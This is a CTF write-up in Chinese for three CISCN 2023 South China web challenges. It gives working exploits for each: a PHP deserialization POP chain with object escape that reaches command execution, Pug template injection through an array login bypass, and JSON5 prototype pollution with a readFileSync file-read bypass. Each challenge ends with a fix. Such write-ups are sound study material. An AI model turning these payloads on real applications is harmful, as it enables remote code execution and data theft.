# CISCN2023华南分区赛


参考：

[https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/](https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/)  

只有web和pwn，还有一个re签到题（不会

## web

### city_pop
知识点：引用绕过wakeup；序列化对象逃逸
```php
<?php
  error_reporting(0);
function filter($str){
  $str=str_replace("getflag",'hark',$str);
  return $str;
}
class Start{
  public $start;
  public $end;
  public function __construct($start,$end)
  {
    $this->start=$start;
    $this->end=$end;
  }
}

class Go{

  public function __destruct()
  {
    echo $this->ray;
  }


}
class Get{
  public $func;
  public $name;
  public function __get($name)
  {
    call_user_func($this->func,$name);

  }

  public function __toString()
  {
    $this->name->{$this->func};

  }

}
class Done{
  public $eval;
  public $class;
  public $use;
  public $useless;
  public function __invoke()
  {
    $this->use=$this->useless;
    eval($this->eval);
  }

  public function __wakeup(){
    $this->eval='no way';
  }
}

if(isset($_GET['ciscn_huaibei.pop'])){
  $pop=new start($_GET['ciscn_huaibei.pop'],$_GET['pop']);
  $ser=filter(serialize($pop));
  unserialize($ser);
}else{
  highlight_file(__FILE__);
}
?>
```
#### 思路一
利用链：Done.__invoke() <-- Get.__get() <-- Get.__toString() <-- Go.__destruct()
通过引用绕过wakeup
```php
$done = new Done();
$done->useless = 'phpinfo();';
$done->eval = &$done->use;
$get = new Get();
$get->func = $done;
$get2 = new Get();
$get2->name = $get;
$go = new Go();
$go->ray = $get2;

$exp = serialize($go);
```
```bash
O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
```
再通过filter函数导致序列化数据变短，覆盖部分数据，进行反序列化逃逸
ciscn_huaibei.pop为getflag，pop为上述序列化数据，过滤后如下
```bash
O:5:"Start":2:{s:5:"start";s:7:"hark";s:3:"end";s:187:"O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}";}
```
要把`";s:3:"end";s:187:`这部分覆盖掉，getflag变成hark缩短3位，故需要6个getflag
同时要满足end元素的值为序列化数据，序列化数据前添加`;s:3:"end";`
```bash
;s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
```
同时，引用在序列化中值R也要改变
直接构造$end=$go，序列化后发现引用值R为8
最后payload：
```bash
?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&pop=;s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:8;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
```
#### 思路二
利用链：Get.__get() <-- Get.__toString() <-- Go.__destruct()
直接用`call_user_func`执行命令，不用Done类，也就不用绕过wake了
```php
$get = new Get();
$get1 = new Get();
$get1->func = "system";
$get->name = $get1;
$get->func = "whoami";

$go = new Go();
$go->ray = $get;
```
接着便是序列化对象逃逸
最后payload

```bash
?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflaggetflag&pop=;;";s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";s:6:"whoami";s:4:"name";O:3:"Get":2:{s:4:"func";s:6:"system";s:4:"name";N;}}}
```
fix  

删掉`$this->use=$this->useless;`

### emoji
数组绕过；pug模板注入
```javascript
const express = require('express');
const ejs=require('ejs')
const session = require('express-session');
const bodyParse = require('body-parser');
const pugjs=require('pug')
function IfLogin(req, res, next){
  if (req.session.user!=null){
    next()
  }else {
    res.redirect('/login')
  }
}
admin={
  "username":"admin",
  "password":"😍😂😍😒😘💕😁🙌"

}
app=express()
app.use(express.json());
app.use(bodyParse.urlencoded({extended: false}));
app.set('view engine', 'ejs');
app.use(session({
  secret: '**************',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 3600 * 1000 }
}));

app.get('/',IfLogin,(req,res)=>{
  res.send('if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !')
})
app.get('/login',(req,res)=>{
  console.log(req.session.user)
  res.render('login')

})
app.post('/login',(req,res)=>{

  var username=req.body.username
  var password=req.body.password

  if(username||password){
    if(username.includes('ad')){
      res.send('you not the true admin')
    }else {
      if(username.toString().substring(0,2)===admin.username.substring(0,2)&&password===admin.password.substring(1,15)){
        console.log(1)
        req.session.user={'username':username,'isadmin':'1'}
        console.log(2)
      }else {

        req.session.user={'username':username}

      }
      res.redirect('/')
    }
  }
  else {
    res.send('please enter usrname or password')
  }
})
app.get('/admin',IfLogin,(req,res)=>{
  if (req.session.user.isadmin==='1'){
    var hello='welcome '+req.session.user.username

    res.send (pugjs.render(hello))
  }
  res.send('you are not admin')
})
app.listen('80', () => {
  console.log(`Example app listening at http://localhost:80`)
})
```
判断条件：
`username.toString().substring(0,2)===admin.username.substring(0,2)&&password===admin.password.substring(1,15)`
数组配合toString绕过
![image-20230910015103472](https://raw.githubusercontent.com/githubmof/img/main/img/image-20230910015103472.png)

json提交

```json
data={
  "username":["admin"],
  "password":"\ude0d😂😍😒😘💕😁\ud83d"
}
```
`res.send (pugjs.render(hello))`，存在pug模板注入，hello包含username  

最后payload：

```python
import requests
url="http://127.0.0.1"
s = requests.Session() #创建一个session
data={
    "username":["admin","#{global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()}"],
    "password":"\ude0d😂😍😒😘💕😁\ud83d"
}
r=s.post(url=url+"/login",json=data)
print(r.text)
r=s.get(url=url+"/admin")
print(r.text)
```
![image-20230805011736905](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050117091.png)

fix  

pug ssti黑名单

### pollution
原型链污染；readFileSync绕过
```javascript
const expres=require('express')
const JSON5 = require('json5');
const bodyParser = require('body-parser')
var fs = require("fs");
const session = require('express-session')
const rand = require('string-random')
var cookieParser = require('cookie-parser');
const SECRET = rand(32, '0123456789abcdef')


const port=80


const app=expres()

app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
app.use(session({
  secret: SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 3600 * 1000 }
}));
app.use(cookieParser());
function waf(obj, arr){
  let verify = true;

  Object.keys(obj).forEach((key) => {
    if (arr.indexOf(key) > -1) {
      verify = false;
    }
  });
  return verify;
}
app.get('/',(req,res)=>{
  res.send('hellllllo!')
})


app.post('/login',(req,res)=>{
  let userinfo=JSON.stringify(req.body)
  const user = JSON5.parse(userinfo)
  if (waf(user, ['admin'])) {
    req.session.user  = user
    if(req.session.user.admin==true){
      req.session.user='admin'
    }
    res.send('login success!')
  }
  else {
    res.send('login error!')
  }
})

app.post('/dosometing',(req,res)=>{
  if (req.session.user === 'admin'){

    if(JSON.stringify(req.body.file).includes("flag")){
      req.body.file=''
    }
    const flag=fs.readFileSync(req.body.file)
    res.send(flag.toString())


  }
  else{
    res.send('you are not admin')
  }
})


app.get('/for_check',(req,res)=>{
  res.send(fs.readFileSync('/app/app.js').toString())
})



app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```
原型链污染
```json
{
	"username":"mof",
  	"__proto__":{"admin":True}
}
```
readFileSync绕过  

[https://cloud.tencent.com/developer/article/2123023](https://cloud.tencent.com/developer/article/2123023)

```json
{
  "file":{
    "href":"mof",
    "origin":"mof",
    "protocol":"file:",
    "hostname":"",
    "pathname":"/fl%61g.txt" 
  }
}
```
payload:
```python
import requests
  
url1="http://127.0.0.1/login"
url2="http://127.0.0.1/dosometing"

data={
    "username":"mof",
    "__proto__":{"admin":True}
}
s=requests.session()
r=s.post(url=url1,json=data)
print(r.text)

r=s.post(url=url2,json={
    "file":{
        "href":"mof",
        "origin":"mof",
        "protocol":"file:",
        "hostname":"",
        "pathname":"/fl%61g.txt" # url编码绕过匹配
    }
})
print(r.text)
```
fix  

`JSON5.parse` 改成 `JSON.parse` 即可


